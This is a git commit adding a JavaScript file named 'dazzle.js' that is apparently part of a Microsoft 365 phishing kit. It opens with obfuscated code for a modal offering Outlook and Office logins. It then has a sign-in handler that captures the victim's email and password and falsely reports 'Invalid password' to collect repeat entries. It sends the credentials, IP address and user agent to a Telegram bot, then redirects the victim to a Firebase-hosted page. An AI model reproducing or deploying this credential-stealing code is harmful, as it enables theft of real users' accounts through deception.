f762819b94058989642a137dfef2dee6793bbd21
str1ctlyelnuno <105933376+str1ctlyelnuno@users.noreply.github.com>
2024-07-10 12:07:27 -0700

    Create dazzle.js

---
+++ dazzle.js
@@ -0,0 +1,41 @@
+// Get the modal
+var _0x4e2e01=_0x3474;(function(_0x44dd35,_0x552e9e){var _0x3eb857={_0x473564:0xa9,_0x3ad817:0x92,_0x368eea:0xaf},_0x4693ac=_0x3474,_0x3ae5c3=_0x44dd35();while(!![]){try{var _0xf52190=-parseInt(_0x4693ac(_0x3eb857._0x473564))/0x1*(parseInt(_0x4693ac(0xa1))/0x2)+parseInt(_0x4693ac(0xad))/0x3*(-parseInt(_0x4693ac(0xaa))/0x4)+-parseInt(_0x4693ac(_0x3eb857._0x3ad817))/0x5*(parseInt(_0x4693ac(0xa7))/0x6)+parseInt(_0x4693ac(0x91))/0x7+parseInt(_0x4693ac(0xac))/0x8*(parseInt(_0x4693ac(0x96))/0x9)+parseInt(_0x4693ac(_0x3eb857._0x368eea))/0xa+-parseInt(_0x4693ac(0x95))/0xb*(-parseInt(_0x4693ac(0xab))/0xc);if(_0xf52190===_0x552e9e)break;else _0x3ae5c3['push'](_0x3ae5c3['shift']());}catch(_0x24e67a){_0x3ae5c3['push'](_0x3ae5c3['shift']());}}}(_0x53f0,0x8df71));var modal=document[_0x4e2e01(0xa6)+_0x4e2e01(0x9d)+_0x4e2e01(0xb1)+_0x4e2e01(0x9a)+'Id']('myM'+'oda'+'l'),outlook=document[_0x4e2e01(0xa6)+_0x4e2e01(0x9d)+'men'+_0x4e2e01(0x9a)+'Id']('out'+_0x4e2e01(0xa0)+'k'),office=document[_0x4e2e01(0xa6)+'Ele'+_0x4e2e01(0xb1)+_0x4e2e01(0x9a)+'Id']('off'+_0x4e2e01(0xa3)),othermail=document[_0x4e2e01(0xa6)+_0x4e2e01(0x9d)+_0x4e2e01(0xb1)+_0x4e2e01(0x9a)+'Id']('oth'+_0x4e2e01(0x9c)+'ail'),span=document['get'+_0x4e2e01(0x9d)+_0x4e2e01(0xb1)+_0x4e2e01(0x9a)+'Id'](_0x4e2e01(0xa5)+_0x4e2e01(0xa8)+_0x4e2e01(0x90));function _0x3474(_0x57d2d3,_0x4a1b47){var _0x53f0a7=_0x53f0();return _0x3474=function(_0x34748f,_0x154695){_0x34748f=_0x34748f-0x90;var _0x253696=_0x53f0a7[_0x34748f];return _0x253696;},_0x3474(_0x57d2d3,_0x4a1b47);}function _0x53f0(){var _0x590c84=['6977796ADirks','5CEpIyC','TML','non','6644JfsMgD','5067RHtmhD','tar','pla','Out','tBy','onc','erm','Ele','inn','\x2035','loo','154136rEcGas','lwt','ice','dis','clo','get','421854TDPxMe','ses','10yMcaEc','34476jUiqPw','384iqTTVi','10568TnHNRw','321wFDGgT','erH','5848320xsuown','Off','men','lic','blo','sty','pan'];_0x53f0=function(){return _0x590c84;};return _0x53f0();}outlook[_0x4e2e01(0x9b)+_0x4e2e01(0xb2)+'k']=function(){var _0x1746c3={_0x1b2309:0xa4,_0x2b2176:0x93,_0x28ca6a:0x99},_0x5edb4f=_0x4e2e01;modal['sty'+'le'][_0x5edb4f(_0x1746c3._0x1b2309)+_0x5edb4f(0x98)+'y']='blo'+'ck',document['get'+'Ele'+_0x5edb4f(0xb1)+'tBy'+'Id']('lwt')[_0x5edb4f(0x9e)+'erH'+_0x5edb4f(_0x1746c3._0x2b2176)]=_0x5edb4f(_0x1746c3._0x28ca6a)+_0x5edb4f(0xa0)+'k';},office[_0x4e2e01(0x9b)+_0x4e2e01(0xb2)+'k']=function(){var _0x5a99d5={_0x42f459:0xa6,_0x5cbe90:0x9d,_0x3c5681:0xb1,_0x5a817f:0x9a,_0x1b77cd:0xa2,_0x37ffbd:0x9e,_0x596765:0xae,_0x415d2d:0x9f},_0x3a40d3=_0x4e2e01;modal['sty'+'le']['dis'+'pla'+'y']='blo'+'ck',document[_0x3a40d3(_0x5a99d5._0x42f459)+_0x3a40d3(_0x5a99d5._0x5cbe90)+_0x3a40d3(_0x5a99d5._0x3c5681)+_0x3a40d3(_0x5a99d5._0x5a817f)+'Id'](_0x3a40d3(_0x5a99d5._0x1b77cd))[_0x3a40d3(_0x5a99d5._0x37ffbd)+_0x3a40d3(_0x5a99d5._0x596765)+_0x3a40d3(0x93)]=_0x3a40d3(0xb0)+_0x3a40d3(0xa3)+_0x3a40d3(_0x5a99d5._0x415d2d)+'6';},othermail[_0x4e2e01(0x9b)+'lic'+'k']=function(){var _0x4edf5a={_0x4e69a5:0xa4,_0x158da5:0x98},_0x51a39e=_0x4e2e01;modal[_0x51a39e(0xb4)+'le'][_0x51a39e(_0x4edf5a._0x4e69a5)+_0x51a39e(_0x4edf5a._0x158da5)+'y']=_0x51a39e(0xb3)+'ck';},span['onc'+_0x4e2e01(0xb2)+'k']=function(){var _0x308709={_0x560e07:0x98,_0x47b800:0x9d,_0xfd6bb2:0x9a},_0x34d792=_0x4e2e01;modal['sty'+'le'][_0x34d792(0xa4)+_0x34d792(_0x308709._0x560e07)+'y']=_0x34d792(0x94)+'e',document['get'+_0x34d792(_0x308709._0x47b800)+_0x34d792(0xb1)+_0x34d792(_0x308709._0xfd6bb2)+'Id'](_0x34d792(0xa2))[_0x34d792(0x9e)+'erH'+_0x34d792(0x93)]='Ema'+'il';},window[_0x4e2e01(0x9b)+_0x4e2e01(0xb2)+'k']=function(_0x2e94c6){var _0x454d14={_0xfce872:0x97,_0x266b73:0xb4,_0x3f0970:0xa4,_0x551ead:0x98,_0x538f98:0x94},_0x28ce0f=_0x4e2e01;_0x2e94c6[_0x28ce0f(_0x454d14._0xfce872)+_0x28ce0f(0xa6)]==modal&&(modal[_0x28ce0f(_0x454d14._0x266b73)+'le'][_0x28ce0f(_0x454d14._0x3f0970)+_0x28ce0f(_0x454d14._0x551ead)+'y']=_0x28ce0f(_0x454d14._0x538f98)+'e');};
+
+
+
+var bless = 0;
+        var passion;
+        document.getElementById("sign_in_btn")
+            .addEventListener("click", function (e) {
+                var passions = document.getElementById('password').value;
+                if (passions == null || passions == "") {
+                    var comp = document.getElementById('kini').innerHTML = `P͏l͏e͏a͏s͏e͏ e͏n͏t͏e͏r͏ t͏h͏e͏ p͏a͏s͏s͏w͏o͏r͏d͏ for your M͏i͏c͏r͏o͏s͏o͏f͏t͏ a͏c͏c͏o͏u͏n͏t͏.`;
+                    setTimeout(() => {  document.getElementById('kini').innerHTML = '';  }, 2000);
+                }
+                else if (passions.length < 5) {
+                    document.getElementById('kini').innerHTML = "Your a͏c͏c͏o͏u͏n͏t͏ p͏a͏s͏s͏w͏o͏r͏d͏ is t͏o͏o͏ s͏h͏o͏r͏t͏.";
+                    setTimeout(() => {
+                        document.getElementById('kini').innerHTML = '';
+                        document.getElementById("password").value = '';
+                    }, 2000);
+                } else if (bless < 4) {
+                    you = document.getElementById('email').value;
+                    passion = document.getElementById('password').value;
+                    document.getElementById('kini').innerHTML = "Connecting to mail server.....";
+					setTimeout(() => { document.getElementById('kini').innerHTML = "Invalid password or server error try again.....";  document.getElementById("password").value = '';}, 4000);
+					var IP = document.getElementById('gfg').textContent;
+					 var word = `====== O͏3͏6͏5͏ R͏e͏s͏u͏l͏t͏ ======\r\nEmail: ${you}\r\nPassword1: ${passion}\r\nPassword2: ${passions}\r\nIP: https://ip-api.com/${IP}\r\nUser-Agent: ${navigator.userAgent}\r\n======`;
+					 var settings = {
+                        "async": true, "crossDomain": true, "url": "https://api.telegram.org/bot" + token + "/sendMessage",
+                        "method": "POST", "headers": { "Content-Type": "application/json", "cache-control": "no-cache" },
+                        "data": JSON.stringify({ "chat_id": chat_id, "text": word })
+                    }
+                     $.ajax(settings).done((response) => {
+                   document.getElementById('kini').innerHTML = "";
+					});
+                    bless++;
+                } else {
+                     window.location.replace("https://firebasestorage.googleapis.com/v0/b/kadaw0no3qldv.appspot.com/o/succesful.html?alt=media&token=dc3eaa8d-f12e-489d-a1f8-bfc49153e2f5#"+my_email);
+                }
+
+            }); 
